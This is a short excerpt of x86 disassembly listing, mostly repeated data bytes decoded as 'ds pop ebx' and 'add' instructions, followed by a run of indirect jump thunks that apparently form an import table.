  4245a6:	ds pop ebx
  4245a8:	add    BYTE PTR [eax],al
  4245aa:	ds pop ebx
  4245ac:	add    BYTE PTR [eax],al
  4245ae:	ds pop ebx
  4245b0:	add    BYTE PTR [eax],al
  4245b2:	ds pop ebx
  4245b4:	add    BYTE PTR [eax],al
  4245b6:	ds pop ebx
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	ds pop ebx
  4245bc:	add    BYTE PTR [eax],al
  4245be:	ds pop ebx
  4245c0:	add    BYTE PTR [eax],al
  4245c2:	ds pop ebx
  4245c4:	add    BYTE PTR [eax],al
  4245c6:	ds pop ebx
  4245c8:	add    BYTE PTR [eax],al
  4245ca:	ds pop ebx
  4245cc:	add    BYTE PTR [eax],al
  4245ce:	ds pop ebx
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	ds pop ebx
  4245d4:	add    BYTE PTR [eax],al
  4245d6:	ds pop ebx
  4245d8:	add    BYTE PTR [eax],al
  4245da:	ds pop ebx
  4245dc:	add    BYTE PTR [eax],al
  4245de:	ds pop ebx
  4245e0:	add    BYTE PTR [eax],al
  4245e2:	ds pop ebx
  4245e4:	add    BYTE PTR [eax],al
  4245e6:	ds pop ebx
	...
  424614:	ds pop ebx
  424616:	add    BYTE PTR [eax],al
  424618:	ds pop ebx
  42461a:	add    BYTE PTR [eax],al
  42461c:	ds pop ebx
  42461e:	add    BYTE PTR [eax],al
  424620:	ds pop ebx
  424622:	add    BYTE PTR [eax],al
  424624:	ds pop ebx
  424626:	add    BYTE PTR [eax],al
  424628:	ds pop ebx
  42462a:	add    BYTE PTR [eax],al
  42462c:	ds pop ebx
  42462e:	add    BYTE PTR [eax],al
  424630:	ds pop ebx
  424632:	add    BYTE PTR [eax],al
  424634:	ds pop ebx
  424636:	add    BYTE PTR [eax],al
  424638:	ds pop ebx
  42463a:	add    BYTE PTR [eax],al
  42463c:	ds pop ebx
  42463e:	add    BYTE PTR [eax],al
  424640:	ds pop ebx
  424642:	add    BYTE PTR [eax],al
  424644:	ds pop ebx
  424646:	add    BYTE PTR [eax],al
  424648:	ds pop ebx
  42464a:	add    BYTE PTR [eax],al
  42464c:	ds pop ebx
  42464e:	add    BYTE PTR [eax],al
  424650:	ds pop ebx
  424652:	add    BYTE PTR [eax],al
  424654:	ds pop ebx
  424656:	add    BYTE PTR [eax],al
  424658:	ds pop ebx
  42465a:	add    BYTE PTR [eax],al
  42465c:	ds pop ebx
  42465e:	add    BYTE PTR [eax],al
  424660:	ds pop ebx
  424662:	add    BYTE PTR [eax],al
  424664:	ds pop ebx
  424666:	add    BYTE PTR [eax],al
  424668:	ds pop ebx
  42466a:	add    BYTE PTR [eax],al
  42466c:	ds pop ebx
  42466e:	add    BYTE PTR [eax],al
  424670:	ds pop ebx
  424672:	add    BYTE PTR [eax],al
  424674:	ds pop ebx
	...
  4246a2:	jmp    DWORD PTR ds:0x427878
  4246a8:	jmp    DWORD PTR ds:0x42787c
  4246ae:	jmp    DWORD PTR ds:0x427880
  4246b4:	jmp    DWORD PTR ds:0x427884
  4246ba:	jmp    DWORD PTR ds:0x427888
  4246c0:	jmp    DWORD PTR ds:0x42788c
  4246c6:	jmp    DWORD PTR ds:0x427890
  4246cc:	jmp    DWORD PTR ds:0x427898
  4246d2:	jmp    DWORD PTR ds:0x4278a0
  4246d8:	jmp    DWORD PTR ds:0x4278a4
